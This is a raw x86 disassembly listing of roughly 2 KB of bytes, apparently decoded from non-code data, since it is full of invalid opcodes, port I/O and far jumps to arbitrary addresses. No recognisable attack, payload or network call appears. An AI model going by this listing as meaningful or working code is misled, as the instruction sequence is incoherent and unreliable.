  407fbd:	mov    WORD PTR [edx],ss
  407fbf:	cmp    DWORD PTR ds:0x534d8a57,edx
  407fc5:	lea    edx,[esp+edx*1+0x1b96b6db]
  407fcc:	jno    0x407fcc
  407fce:	xor    eax,0x95e393eb
  407fd3:	aam    0xd8
  407fd5:	out    0x59,eax
  407fd7:	mov    al,0xe2
  407fd9:	cmp    al,0x8d
  407fdb:	mov    WORD PTR [edi+eax*2+0x60],gs
  407fdf:	test   eax,0x1f377f4b
  407fe4:	xchg   esp,eax
  407fe5:	mov    ch,0xae
  407fe7:	mov    ds:0x9779719a,al
  407fec:	pop    ebp
  407fed:	mov    bh,0x27
  407fef:	adc    eax,0xfab9960
  407ff4:	sub    ebx,DWORD PTR [edx]
  407ff6:	sti    
  407ff7:	adc    ecx,edx
  407ff9:	mov    cl,0xc8
  407ffb:	cwde   
  407ffc:	push   cs
  407ffd:	or     dh,BYTE PTR [ebx+0x49]
  408000:	xchg   ebp,eax
  408001:	stos   DWORD PTR es:[edi],eax
  408002:	cdq    
  408003:	xchg   esp,eax
  408004:	int    0x24
  408006:	add    ecx,DWORD PTR [eax+edi*1+0x2aacf523]
  40800d:	in     eax,dx
  40800e:	or     BYTE PTR [eax-0x64],bh
  408011:	aas    
  408012:	outs   dx,BYTE PTR ds:[esi]
  408013:	in     eax,0x3d
  408015:	cmovne eax,DWORD PTR [ecx-0x6f]
  408019:	aam    0x15
  40801b:	loop   0x407fad
  40801d:	sti    
  40801e:	xor    ebx,DWORD PTR [ebx+0x79c595a6]
  408024:	loop   0x40805c
  408026:	xor    eax,0x3e37e3ce
  40802b:	lahf   
  40802c:	xor    bh,cl
  40802e:	push   esi
  40802f:	jae    0x407fd1
  408031:	bound  esi,QWORD PTR ss:[esp+eax*1-0x10]
  408036:	sub    al,0xca
  408038:	mov    ds:0x598a96cd,eax
  40803d:	sbb    BYTE PTR [edi+0x1b27cd8b],ah
  408043:	sbb    ecx,0x8aadcd37
  408049:	and    DWORD PTR [esi-0x16],0x42ff030d
  408050:	fs test al,0x93
  408053:	icebp  
  408054:	jmp    0x8baa:0x82b0cf05
  40805b:	xchg   esp,eax
  40805c:	sub    BYTE PTR [ecx+esi*2-0x219dbac4],0x95
  408064:	jmp    0x43a51afe
  408069:	adc    ch,al
  40806b:	pop    ebp
  40806c:	fcomip st,st(1)
  40806e:	imul   esi,DWORD PTR [eax-0x4eae4431],0x16
  408075:	rcr    BYTE PTR [esi+0x73485c68],1
  40807b:	jp     0x4080a9
  40807d:	push   esi
  40807e:	cmp    BYTE PTR [edi-0x3f],dh
  408081:	xchg   ecx,eax
  408082:	xchg   ebx,eax
  408083:	cdq    
  408084:	xor    eax,0x2842d95e
  408089:	push   eax
  40808a:	pop    ds
  40808b:	fcmovnb st,st(3)
  40808d:	mov    WORD PTR [edi+0x6ad18e77],fs
  408093:	in     al,0xc2
  408095:	inc    ebp
  408096:	inc    ebp
  408097:	jmp    0xfd0a:0x38db61d2
  40809e:	mov    esp,0x8c62587d
  4080a3:	sub    edx,DWORD PTR [edx]
  4080a5:	push   ebx
  4080a6:	call   0x5c54edd7
  4080ab:	mov    ch,0x19
  4080ad:	jle    0x4080ea
  4080af:	mov    eax,ds:0x92465554
  4080b4:	lahf   
  4080b5:	cmp    BYTE PTR [ebx+ebp*2+0x7e],dl
  4080b9:	mov    bh,0x2e
  4080bb:	push   ss
  4080bc:	add    DWORD PTR [esi+0x1a],0x954de78c
  4080c3:	dec    esi
  4080c4:	jle    0x4080b8
  4080c6:	ins    DWORD PTR es:[edi],dx
  4080c7:	push   eax
  4080c8:	adc    DWORD PTR [ebp+0x6a],ecx
  4080cb:	pop    edx
  4080cc:	(bad)  
  4080cd:	(bad)  
  4080cf:	ss add bh,cl
  4080d2:	fmul   st,st(1)
  4080d4:	cmp    al,0xba
  4080d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080d7:	repnz scas al,BYTE PTR es:[edi]
  4080d9:	dec    eax
  4080da:	sbb    ch,BYTE PTR [ebx+eax*1]
  4080dd:	stc    
  4080de:	cmp    al,BYTE PTR [ebx]
  4080e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e1:	inc    edx
  4080e2:	dec    eax
  4080e3:	and    eax,0xb57466fd
  4080e8:	lock test DWORD PTR [edi],ebp
  4080eb:	mov    ebp,0xeed101be
  4080f0:	cmp    BYTE PTR [ebp-0x1fac85d8],dl
  4080f6:	jl     0x408128
  4080f8:	leave  
  4080f9:	pop    ds
  4080fa:	jne    0x408097
  4080fc:	jmp    0xdab5bbca
  408101:	lods   al,BYTE PTR ds:[esi]
  408102:	push   0xb413a97e
  408107:	fidiv  WORD PTR [ebx]
  408109:	je     0x4080c1
  40810b:	sub    cl,BYTE PTR [ecx+0x3c]
  40810e:	xor    al,0xd0
  408110:	mov    esi,DWORD PTR [ebp-0x5f]
  408113:	icebp  
  408114:	packuswb mm4,QWORD PTR [edx]
  408117:	mov    ds:0x4be7d1ee,eax
  40811c:	sbb    eax,0x51d073d6
  408121:	push   es
  408122:	xor    cl,BYTE PTR ds:0x6c68a905
  408128:	xchg   BYTE PTR [esi+0x173a86bd],ch
  40812e:	push   ds
  40812f:	sbb    al,0xf0
  408131:	sbb    DWORD PTR [ebp-0x1b0360d5],ebx
  408137:	push   0x65dcefbc
  40813c:	mov    DWORD PTR [esi-0x6bf94700],esi
  408142:	inc    edx
  408143:	xchg   edi,eax
  408144:	or     al,0x14
  408146:	lahf   
  408147:	or     al,0xb8
  40814a:	or     eax,0x47c9bf3
  40814f:	and    BYTE PTR [ecx],cl
  408151:	adc    edi,DWORD PTR [edx-0x4f]
  408154:	lock bound ebp,QWORD PTR [ebp+0x105c5e9f]
  40815b:	xchg   esp,eax
  40815c:	js     0x40815b
  40815e:	dec    edx
  40815f:	sub    dh,BYTE PTR [eax+ecx*2-0x6e]
  408163:	repnz adc DWORD PTR [esi-0x4f648a6],edi
  40816a:	inc    esi
  40816b:	dec    ebx
  40816c:	pop    esi
  40816d:	pop    es
  40816e:	xor    cl,BYTE PTR [edi+0x5b]
  408171:	bound  edi,QWORD PTR [ecx]
  408173:	pop    es
  408174:	jb     0x408182
  408176:	mov    ebx,es
  408178:	jno    0x408179
  40817a:	sbb    eax,0xcfd5817
  40817f:	mov    ecx,DWORD PTR ds:0x90030e53
  408185:	or     DWORD PTR [esi+0x7eb55651],esi
  40818b:	xchg   BYTE PTR [eax-0x6f5a251],dh
  408191:	push   es
  408192:	xchg   edi,eax
  408193:	out    0x1e,al
  408195:	cdq    
  408196:	jl     0x40816f
  408198:	and    al,0xb9
  40819a:	js     0x4081b8
  40819c:	xchg   BYTE PTR [edi-0x7d73c4f5],bh
  4081a2:	adc    ah,0x65
  4081a5:	in     al,0x2f
  4081a7:	(bad)  
  4081a8:	push   ss
  4081a9:	outs   dx,DWORD PTR ds:[esi]
  4081aa:	adc    al,al
  4081ac:	pop    ecx
  4081ad:	mov    ah,0x5d
  4081af:	jne    0x40819a
  4081b1:	dec    ebx
  4081b2:	pop    edx
  4081b3:	xor    ah,BYTE PTR [ecx-0x69]
  4081b6:	xor    DWORD PTR [eax+0x1e576e63],ebx
  4081bc:	xchg   esi,eax
  4081bd:	xchg   BYTE PTR [ebp-0x1d0a985e],bh
  4081c3:	xor    edi,DWORD PTR [eax]
  4081c5:	mov    ds:0x492d738e,al
  4081ca:	mov    dl,0x81
  4081cc:	pop    ebp
  4081cd:	mov    ah,bh
  4081cf:	hlt    
  4081d0:	push   ebp
  4081d1:	out    dx,eax
  4081d2:	repz mov eax,ds:0x2d31f53c
  4081d8:	std    
  4081d9:	out    dx,al
  4081da:	pop    edx
  4081db:	mov    ah,bl
  4081dd:	jo     0x4081e8
  4081df:	sub    al,dl
  4081e1:	cmp    al,0x6f
  4081e3:	loope  0x40819b
  4081e5:	mov    bl,bl
  4081e7:	into   
  4081e8:	aaa    
  4081e9:	lock scas al,BYTE PTR es:[edi]
  4081eb:	sub    BYTE PTR [eax+eiz*1],0xba
  4081ef:	mov    esi,0x23929fdd
  4081f4:	in     eax,0x77
  4081f6:	sbb    al,0xa5
  4081f8:	in     al,0xd2
  4081fa:	fst    st(5)
  4081fc:	mov    BYTE PTR [esi],dh
  4081fe:	push   esp
  4081ff:	jo     0x4081c5
  408201:	pop    ebx
  408202:	dec    esi
  408203:	fisub  WORD PTR [eax+0xd]
  408206:	mov    ds:0x375509e0,eax
  40820b:	sbb    dh,ah
  40820d:	mov    esp,DWORD PTR ds:[ebp+0x2f]
  408211:	or     al,0x23
  408213:	pop    ebx
  408214:	imul   ebp,DWORD PTR [ebp+0x30],0xffffffdb
  408218:	add    al,0x56
  40821a:	cmp    eax,DWORD PTR [edi+0x6cf43b13]
  408220:	mov    bh,bh
  408222:	push   0xffffff95
  408224:	xlat   BYTE PTR ds:[ebx]
  408225:	rol    BYTE PTR [edx-0xb98292e],0xca
  40822c:	stc    
  40822d:	lods   al,BYTE PTR ds:[esi]
  40822e:	mov    dh,0x8a
  408230:	add    eax,0xd46f7b59
  408235:	mov    WORD PTR [ebx-0x7],?
  408238:	popa   
  408239:	sbb    ebx,DWORD PTR [ebx+0xf089f72]
  40823f:	shl    eax,cl
  408241:	dec    edx
  408242:	jl     0x408260
  408244:	out    dx,eax
  408245:	cmp    esp,DWORD PTR [ebx+0x29]
  408248:	xor    al,0xfb
  40824a:	or     DWORD PTR [ebp+0x5a],ebp
  40824d:	mov    dl,BYTE PTR [edx]
  40824f:	add    al,0x54
  408251:	mov    ah,0xd
  408253:	mov    ebp,0x9791150e
  408258:	mov    ecx,0x80c4f29a
  40825d:	das    
  40825e:	outs   dx,DWORD PTR ds:[esi]
  40825f:	arpl   WORD PTR [ebx],di
  408261:	dec    esp
  408262:	inc    edi
  408263:	arpl   WORD PTR [eax],si
  408265:	mov    al,0x6d
  408267:	and    eax,0xbe0144a5
  40826c:	icebp  
  40826d:	loope  0x408253
  40826f:	mov    ah,0x7b
  408271:	mov    esi,ebp
  408273:	or     ah,ch
  408275:	test   eax,0x42d94fa4
  40827a:	and    eax,0x35b3bf01
  40827f:	cmp    ch,bh
  408281:	xchg   ebx,eax
  408282:	jecxz  0x408271
  408284:	retf   0x4171
  408287:	adc    eax,0x6bf3b0af
  40828c:	mov    dl,0xc6
  40828e:	popf   
  40828f:	dec    edx
  408290:	jp     0x408308
  408292:	fs nop
  408294:	xor    al,0x2c
  408296:	and    al,0xcd
  408298:	xor    DWORD PTR [ebx+ebx*8+0xf],0xa7cb0056
  4082a0:	or     ah,BYTE PTR [eax]
  4082a2:	pop    edi
  4082a3:	mov    BYTE PTR [edi+0x1b7e9d60],0x7c
  4082aa:	call   0x29c64c58
  4082af:	push   edx
  4082b0:	mov    eax,ds:0x17cbe6ff
  4082b5:	mov    edx,0x66101bb8
  4082ba:	inc    eax
  4082bb:	and    BYTE PTR [edi+ebp*4-0x61ad05f],bl
  4082c2:	mov    esp,0xcc2717bd
  4082c7:	std    
  4082c8:	mov    ebp,0xa640e081
  4082cd:	ja     0x408323
  4082cf:	mov    ?,WORD PTR [esi+0x6c]
  4082d2:	xchg   edi,eax
  4082d3:	repz scas eax,DWORD PTR es:[edi]
  4082d5:	daa    
  4082d6:	or     al,0x8f
  4082d8:	lock sbb eax,0x4f90bee0
  4082de:	outs   dx,DWORD PTR ds:[esi]
  4082df:	pop    ds
  4082e0:	and    ecx,DWORD PTR [ecx]
  4082e2:	pop    esi
  4082e3:	ins    DWORD PTR es:[edi],dx
  4082e4:	mov    dl,0xb6
  4082e6:	sub    dh,BYTE PTR [esi-0x15]
  4082e9:	inc    edi
  4082ea:	fisub  DWORD PTR [ebp-0x51]
  4082ed:	neg    dl
  4082ef:	cmp    BYTE PTR [ecx-0x584e609e],ah
  4082f5:	jno    0x4082a2
  4082f7:	(bad)  
  4082f8:	pop    ss
  4082f9:	pop    ecx
  4082fa:	and    eax,0x341627aa
  4082ff:	xchg   DWORD PTR [ecx-0x14],edx
  408302:	stos   DWORD PTR es:[edi],eax
  408303:	jnp    0x4082aa
  408305:	nop
  408306:	pop    ebx
  408307:	lds    edi,FWORD PTR [edi-0x2289e9d9]
  40830d:	in     eax,dx
  40830e:	pop    es
  40830f:	js     0x4082d6
  408311:	jmp    0x5cc6:0x94657bea
  408318:	out    dx,eax
  408319:	adc    BYTE PTR [ebx+edx*1],0xd3
  40831d:	inc    eax
  40831e:	(bad)  
  40831f:	lods   al,BYTE PTR ds:[esi]
  408320:	ins    DWORD PTR es:[edi],dx
  408321:	push   ebp
  408322:	jne    0x4082ea
  408324:	push   esi
  408325:	jg     0x4083a4
  408327:	sub    DWORD PTR gs:0x4413a478,ebp
  40832e:	and    edx,DWORD PTR [ebx-0x79]
  408331:	and    cl,ch
  408333:	pusha  
  408334:	pop    edi
  408335:	xchg   esi,eax
  408336:	and    esi,edi
  408338:	mov    esp,ebp
  40833a:	ins    BYTE PTR es:[edi],dx
  40833b:	mov    dl,0xe3
  40833d:	daa    
  40833e:	xor    dh,dh
  408340:	lahf   
  408341:	jmp    0x4431:0x2ab9b0e7
  408348:	sub    eax,0x72119093
  40834d:	mov    bl,BYTE PTR [ebp-0x3b81ca61]
  408353:	int    0x90
  408355:	sub    bl,al
  408357:	call   DWORD PTR [esi+edx*1-0x3c]
  40835b:	das    
  40835c:	adc    DWORD PTR [eax],0xffffffe3
  40835f:	fwait
  408360:	sahf   
  408361:	sbb    eax,0xe242918a
  408366:	and    eax,0x18
  408369:	cmp    al,0xe0
  40836b:	arpl   WORD PTR [esi+0x559ac95d],dx
  408371:	stos   BYTE PTR es:[edi],al
  408372:	je     0x40836b
  408374:	mov    ds:0xac3d2f87,eax
  408379:	loope  0x4083ba
  40837b:	pushf  
  40837c:	fldenv [esi]
  40837e:	nop
  40837f:	push   0x2db8a24e
  408384:	popf   
  408385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408386:	mov    al,0xbc
  408388:	sub    BYTE PTR [ecx+ecx*4],0x8e
  40838c:	loop   0x4083d1
  40838e:	push   eax
  40838f:	jo     0x4083b8
  408391:	aad    0x16
  408393:	jge    0x40839c
  408395:	cmp    DWORD PTR [ebx+0x46],esi
  408398:	(bad)  
  408399:	push   0xffffff9f
  40839b:	adc    eax,0x8f689663
  4083a0:	fucomi st,st(1)
  4083a2:	fisttp DWORD PTR [edi-0xc8e40de]
  4083a8:	jl     0x40840c
  4083aa:	mov    ecx,DWORD PTR [ebx]
  4083ac:	(bad)  
  4083ad:	sub    edx,DWORD PTR [edx-0x25d51acb]
  4083b3:	aad    0xbf
  4083b5:	cmp    BYTE PTR [ebx+0x6b62f72e],dl
  4083bb:	loopne 0x40842c
  4083bd:	mov    ds:0x207d5701,al
  4083c2:	mov    ah,BYTE PTR [edi-0x144cfce]
  4083c8:	inc    edx
  4083c9:	lods   al,BYTE PTR ds:[esi]
  4083ca:	stc    
  4083cb:	jbe    0x408411
  4083cd:	fwait
  4083ce:	jns    0x408406
  4083d0:	cs in  eax,dx
  4083d2:	popf   
  4083d3:	adc    edi,esi
  4083d5:	mov    ecx,0xe318f13b
  4083da:	mov    ds:0x77a9175c,al
  4083df:	dec    esp
  4083e0:	out    dx,al
  4083e1:	dec    eax
  4083e2:	or     bh,dh
  4083e4:	addr16 seta dl
  4083e8:	cs sbb eax,0x201abe85
  4083ee:	mov    al,0x8f
  4083f0:	sbb    DWORD PTR [edx+0x26],esp
  4083f3:	sub    al,0xa9
  4083f5:	xor    bl,BYTE PTR [esi]
  4083f7:	out    dx,al
  4083f8:	or     dh,BYTE PTR [ebx-0x36b03512]
  4083fe:	or     dh,dh
  408400:	mov    esp,0x5b24404d
  408405:	mov    cl,0xb8
  408407:	pop    ebx
  408408:	push   edx
  408409:	pop    es
  40840a:	leave  
  40840b:	push   cs
  40840c:	mov    ebp,0x2d0282f3
  408411:	ins    BYTE PTR es:[edi],dx
  408412:	fs jne 0x408441
  408415:	mov    cl,0x7
  408417:	and    al,0x4f
  408419:	test   BYTE PTR [edi-0x4ca31584],bh
  40841f:	mov    ebp,DWORD PTR [esi+0x7216c5d6]
  408425:	fisttp QWORD PTR [edx]
  408427:	jb     0x40842a
  408429:	mov    BYTE PTR ds:0xeeac3465,ah
  40842f:	xor    cl,0x6c
  408432:	jb     0x40840e
  408434:	adc    DWORD PTR [edi-0x4322436f],ecx
  40843a:	jge    0x408450
  40843c:	imul   esi,DWORD PTR [ecx+ecx*2],0x41
  408440:	rcr    dh,cl
  408442:	shl    DWORD PTR [eax+0x7e55d8c6],1
  408448:	push   edi
  408449:	mov    bl,BYTE PTR ds:0xd53f1cea
  40844f:	(bad)  
  408450:	(bad)  
  408451:	dec    edi
  408452:	lods   al,BYTE PTR ds:[esi]
  408453:	iret   
  408454:	xor    eax,0xcdcd63bf
  408459:	xlat   BYTE PTR ds:[ebx]
  40845a:	in     eax,0xa3
  40845c:	dec    esp
  40845d:	jle    0x40847b
  40845f:	iret   
  408460:	pusha  
  408461:	push   ebp
  408462:	xchg   edi,eax
  408463:	inc    edx
  408464:	dec    edi
  408465:	mov    bl,dh
  408467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408468:	scas   al,BYTE PTR es:[edi]
  408469:	mov    WORD PTR [eax],ds
  40846b:	aad    0x6c
  40846d:	sbb    bh,ch
  40846f:	jle    0x4084c0
  408471:	xor    edi,DWORD PTR [esi]
  408473:	sar    ah,1
  408475:	leave  
  408476:	push   edx
  408477:	xchg   DWORD PTR [esi+0x50e1c143],ebp
  40847d:	sub    ebx,esi
  40847f:	enter  0x6bbf,0x47
  408483:	dec    esi
  408484:	dec    ebx
  408485:	rol    DWORD PTR [edi],1
  408487:	pop    eax
  408488:	xor    al,0x14
  40848a:	inc    ecx
  40848b:	dec    eax
  40848c:	pop    es
  40848d:	mov    ds:0xc7aac320,eax
  408492:	fwait
  408493:	out    0x49,eax
  408495:	test   DWORD PTR [edi],edi
  408497:	in     eax,0x4e
  408499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40849a:	push   es
  40849b:	lock mov ah,0x9a
  40849e:	mov    esi,0xdc408f86
  4084a3:	pop    ecx
  4084a4:	and    ebp,DWORD PTR [esi]
  4084a6:	mov    ds:0x92df29d1,al
  4084ab:	inc    edi
  4084ac:	jmp    0x408444
  4084ae:	repz mov ds:0x22ad7e4,eax
  4084b4:	push   cs
  4084b5:	out    0x8a,eax
  4084b7:	xlat   BYTE PTR ds:[ebx]
  4084b8:	jo     0x408477
  4084ba:	jae    0x40853b
  4084bc:	sub    edx,ebp
  4084be:	stos   DWORD PTR es:[edi],eax
  4084bf:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084c1:	cmp    DWORD PTR [edi+0x4f40f9ce],ebp
  4084c7:	push   ss
  4084c8:	nop
  4084c9:	loope  0x408529
  4084cb:	shr    BYTE PTR [ecx],0x43
  4084ce:	cwde   
  4084cf:	not    BYTE PTR [edx+ebx*2+0x411086b6]
  4084d6:	mov    eax,0x41434a79
  4084db:	sub    DWORD PTR [edx+0x121c2903],ecx
  4084e1:	inc    eax
  4084e2:	cmc    
  4084e3:	xchg   ebx,eax
  4084e4:	sbb    eax,0xdc49a84c
  4084e9:	push   ebx
  4084ea:	into   
  4084eb:	je     0x40852d
  4084ed:	cmp    cl,ch
  4084ef:	aaa    
  4084f0:	xchg   esp,eax
  4084f1:	and    eax,esp
  4084f3:	lea    esi,[ebp-0x7476370f]
  4084f9:	mov    ebx,0x7bb71694
  4084fe:	inc    ecx
  4084ff:	jae    0x408518
  408501:	js     0x40856a
  408503:	push   es
  408504:	sar    BYTE PTR [ebx+0x63],1
  408507:	retf   
  408508:	xchg   edi,eax
  408509:	sbb    esp,DWORD PTR [ecx+eiz*1]
  40850c:	lock aad 0x8f
  40850f:	add    eax,0x6b465bc2
  408514:	out    dx,eax
  408515:	pop    esp
  408516:	scas   eax,DWORD PTR es:[edi]
  408517:	cmp    BYTE PTR [edi-0x2bdfc3b3],0x98
  40851e:	jp     0x4084c2
  408520:	xchg   ebp,eax
  408521:	int3   
  408522:	inc    ebx
  408523:	iret   
  408524:	fwait
  408525:	je     0x4084c3
  408527:	addr16 push es
  408529:	lods   eax,DWORD PTR ds:[esi]
  40852a:	dec    esp
  40852b:	mov    eax,cs:0x681c2b8
  408531:	in     al,0xab
  408533:	mov    bl,0x92
  408535:	push   ebp
  408536:	ficom  DWORD PTR [edi-0x5f]
  408539:	(bad)  [ecx]
  40853b:	data16 jbe 0x408596
  40853e:	std    
  40853f:	lahf   
  408540:	xor    eax,DWORD PTR [ebp-0x45]
  408543:	and    ebx,DWORD PTR [edx-0x46674ca6]
  408549:	adc    cl,BYTE PTR [edi]
  40854b:	and    esi,edi
  40854d:	jo     0x40856f
  40854f:	lds    edi,FWORD PTR ds:0x20d790d6
  408555:	retf   
  408556:	das    
  408557:	jg     0x4084ff
  408559:	push   0x7bc5cc7e
  40855e:	xor    cl,ah
  408560:	sub    dh,dl
  408562:	fdiv   QWORD PTR [esp+ebx*8-0x6a]
  408566:	clc    
  408567:	lock leave 
  408569:	scas   eax,DWORD PTR es:[edi]
  40856a:	int3   
  40856b:	mov    dl,0x97
  40856d:	push   cs
  40856e:	mov    bh,0xd8
  408570:	scas   al,BYTE PTR es:[edi]
  408571:	cld    
  408572:	jae    0x4085df
  408574:	aad    0x6c
  408576:	xchg   DWORD PTR [ebp-0x14],esi
  408579:	jne    0x408532
  40857b:	jns    0x4085bb
  40857d:	sbb    bl,BYTE PTR [edx-0x64]
  408580:	or     eax,0x72cbe9a1
  408585:	mov    ds:0x49ed4dd9,al
  40858a:	test   BYTE PTR [eax-0x17],0x19
  40858e:	adc    DWORD PTR [ecx],edx
  408590:	inc    ebx
  408591:	mov    edi,0xaa001ada
  408596:	xchg   DWORD PTR ss:[esi-0x6a6bfde8],ebx
  40859d:	les    eax,FWORD PTR [esi-0x23]
  4085a0:	repnz mov eax,0x2af2e21a
  4085a6:	cdq    
  4085a7:	fsubrp st(1),st
  4085a9:	ins    DWORD PTR es:[edi],dx
  4085aa:	loopne 0x40858a
  4085ac:	loope  0x408617
  4085ae:	cmp    BYTE PTR [ebx+0x60],ah
  4085b1:	mov    ch,0x8c
  4085b3:	sbb    DWORD PTR [edi+0x68],eax
  4085b6:	bound  eax,QWORD PTR [eax-0x668bd810]
  4085bc:	adc    bl,BYTE PTR [edi-0x167b8c8d]
  4085c2:	pop    esi
  4085c3:	sub    ch,bh
  4085c5:	aam    0x7a
  4085c7:	rcl    BYTE PTR [eax+0x31],1
  4085ca:	js     0x408554
  4085cc:	shl    DWORD PTR [ebx-0x31ec931d],0x1f
  4085d3:	push   ebp
  4085d4:	mov    ch,0x3b
  4085d6:	dec    esi
  4085d7:	push   esp
  4085d8:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  4085df:	mov    eax,DWORD PTR [ebp-0x4]
  4085e2:	jmp    0x40a991
  4085e7:	sbb    eax,0x84488431
  4085ec:	les    ebx,FWORD PTR [ebp+0xc292524]
  4085f2:	push   0xffffffdb
  4085f4:	js     0x4085b9
  4085f6:	xor    DWORD PTR [ecx+0x19],edi
  4085f9:	add    DWORD PTR [ebx-0x7c7c9f0f],0x51
  408600:	push   0x38
  408602:	jg     0x4085a2
  408604:	out    dx,al
  408605:	add    al,BYTE PTR [esi-0x7f]
  408608:	xchg   ebp,eax
  408609:	(bad)  
  40860a:	icebp  
  40860b:	xchg   edi,eax
  40860c:	test   DWORD PTR [ecx],eax
  40860e:	dec    esp
  40860f:	test   esp,esi
  408611:	add    esi,DWORD PTR ds:0xaa7eef0a
  408617:	imul   esi,DWORD PTR [ecx+0x5f],0x28ed74b0
  40861e:	clc    
  40861f:	jmp    0xd93155cb
  408624:	sub    eax,ebx
  408626:	mov    ds:0x7354206f,al
  40862b:	jecxz  0x4085e0
  40862d:	out    0x62,eax
  40862f:	xchg   ebx,eax
  408630:	fistp  QWORD PTR [esp+eax*8-0x68aa34f9]
  408637:	ror    esp,1
  408639:	adc    DWORD PTR [esi+0x54],esp
  40863c:	lods   eax,DWORD PTR ds:[esi]
  40863d:	shr    BYTE PTR ds:0x93aded08,0xca
  408644:	fiadd  WORD PTR [ecx]
  408646:	ins    DWORD PTR es:[edi],dx
  408647:	shl    BYTE PTR [esi-0x76],1
  40864a:	sbb    eax,DWORD PTR [ecx+0x43]
  40864d:	mov    dh,0x95
  40864f:	xchg   esi,eax
  408650:	leave  
  408651:	loop   0x408642
  408653:	ins    BYTE PTR es:[edi],dx
  408654:	mov    eax,DWORD PTR gs:[eax+eax*1]
  408658:	mov    edx,0xa14d9c83
  40865d:	adc    edx,ebx
  40865f:	jo     0x408620
  408661:	cmp    eax,0x11b1153
  408666:	repnz xor DWORD PTR [edi-0x41ab3ee8],0x49c68326
  408671:	fwait
  408672:	cmp    esi,DWORD PTR [ebx-0x7a]
  408675:	or     bh,ch
  408677:	xchg   ebp,eax
  408678:	mov    WORD PTR [edi-0x7b],fs
  40867b:	out    0x99,al
  40867d:	sub    bh,dl
  40867f:	mov    cl,0xb1
  408681:	ins    DWORD PTR es:[edi],dx
  408682:	in     eax,dx
  408683:	fild   WORD PTR [ebx]
  408685:	push   ebp
  408686:	cmp    dh,BYTE PTR [esi-0x18ac1b9e]
  40868c:	jno    0x408679
  40868e:	jp     0x408626
  408690:	pop    ds
  408691:	imul   BYTE PTR [eax-0x62bf3ae0]
  408697:	cmp    al,bh
  408699:	std    
  40869a:	mov    esi,0x1cfefb1c
  40869f:	sbb    eax,0x9ecc6f2e
  4086a4:	leave  
  4086a5:	test   DWORD PTR [ebx],ebx
  4086a7:	jmp    0x40862d
  4086a9:	out    0xc4,eax
  4086ab:	mov    ds:0x1973ae73,eax
  4086b0:	clc    
  4086b1:	lahf   
  4086b2:	cwde   
  4086b3:	mov    eax,0xf9797ac
  4086b8:	imul   DWORD PTR [ecx-0x34]
  4086bb:	or     al,0x34
  4086bd:	pop    ebx
  4086be:	hlt    
  4086bf:	sar    BYTE PTR [ecx+0xc],0xc6
  4086c3:	gs jbe 0x4086f4
  4086c6:	out    0x60,al
  4086c8:	xor    al,0xd5
  4086ca:	jmp    0xfa3f:0xce17372
  4086d1:	push   ss
  4086d2:	adc    al,0x93
  4086d4:	dec    ebp
  4086d5:	shl    DWORD PTR [ebx+0x45],1
  4086d8:	or     eax,0xefdf13
  4086dd:	push   ss
  4086de:	push   ebx
  4086df:	repz (bad) 
  4086e1:	nop
  4086e2:	cmp    eax,esi
  4086e4:	adc    BYTE PTR [esi],dh
  4086e6:	pushf  
  4086e7:	aad    0xb7
  4086e9:	sbb    al,0xe3
  4086eb:	aam    0x73
  4086ed:	inc    ebp
  4086ee:	adc    al,0xd9
  4086f0:	or     DWORD PTR [ebp-0x2c],edx
  4086f3:	pop    ss
  4086f4:	adc    edx,eax
  4086f6:	(bad)  
  4086f7:	mov    edx,0xaf7d3899
  4086fc:	and    al,0xa
  4086fe:	(bad)  
  4086ff:	je     0x4086e4
  408701:	aaa    
  408702:	ficom  DWORD PTR [esi]
  408704:	arpl   bp,sp
  408706:	lods   al,BYTE PTR ds:[esi]
  408707:	sub    BYTE PTR [ecx+0xd],0xc9
  40870b:	cwde   
  40870c:	fwait
  40870d:	add    dl,ch
  40870f:	jmp    0x4086c9
  408711:	push   ebx
  408712:	mov    ebx,eax
  408714:	jp     0x408754
  408716:	loop   0x40878e
  408718:	stos   BYTE PTR es:[edi],al
  408719:	pop    ebx
  40871a:	(bad)  
  40871b:	rcr    DWORD PTR [edi],cl
  40871d:	inc    ebp
  40871e:	fwait
  40871f:	std    
  408720:	in     eax,0xd8
  408722:	clc    
  408723:	inc    ebx
  408724:	adc    eax,0x271a284c
  408729:	into   
  40872a:	into   
  40872b:	sub    DWORD PTR [ebx],ecx
  40872d:	add    BYTE PTR [ebx],bl
  40872f:	pop    edx
  408730:	out    dx,eax
  408731:	fisttp QWORD PTR [esi+0x5dd7300f]
  408737:	inc    eax
  408738:	(bad)  
  408739:	jp     0x408762
  40873b:	jmp    0x8cb2678a
  408740:	icebp  
  408741:	jmp    ebp
  408743:	bnd jbe 0x4087bd
  408746:	xor    ch,BYTE PTR [edx+edx*4-0x7a]
  40874a:	dec    edi
  40874b:	and    eax,0xb1ececa8
  408750:	jl     0x40876d
  408752:	in     eax,0x7b
  408754:	stos   DWORD PTR es:[edi],eax
  408755:	inc    esp
  408756:	cli    
  408757:	dec    esi
  408758:	push   ecx
  408759:	push   ss
  40875a:	ds inc ebp
  40875c:	mov    eax,ds:0x51e10ae8
  408761:	les    ebx,FWORD PTR [edi+0x372a5f6e]
  408767:	mov    dh,0x32
  408769:	test   edx,ecx
  40876b:	jne    0x4087dc
  40876d:	jl     0x408728
  40876f:	pop    esi
  408770:	and    DWORD PTR ds:0xc07eea65,edx
  408776:	jmp    0x9452:0xcc5a9a75
  40877d:	xchg   esi,eax
  40877e:	jmp    0x4c1a:0x2703a8a3
  408785:	(bad)  
  408787:	fs mov ebp,0x4bd2019
  40878d:	call   0x9fcd:0x5fa891d2
  408794:	xlat   BYTE PTR ds:[ebx]
  408795:	loop   0x4087b2
  408797:	pop    ebp
  408798:	out    0x48,al
  40879a:	ins    BYTE PTR es:[edi],dx
  40879b:	xor    DWORD PTR [ebx-0x24661edb],ecx
  4087a1:	add    BYTE PTR [eax-0x39],bh
  4087a4:	test   al,0xda
  4087a6:	xchg   edi,eax
  4087a7:	scas   al,BYTE PTR es:[edi]
  4087a8:	std    
  4087a9:	jmp    0xb1ad7b06
  4087ae:	pop    eax
  4087af:	stos   BYTE PTR es:[edi],al
  4087b0:	cld    
  4087b1:	mov    eax,0x3f9a4df8
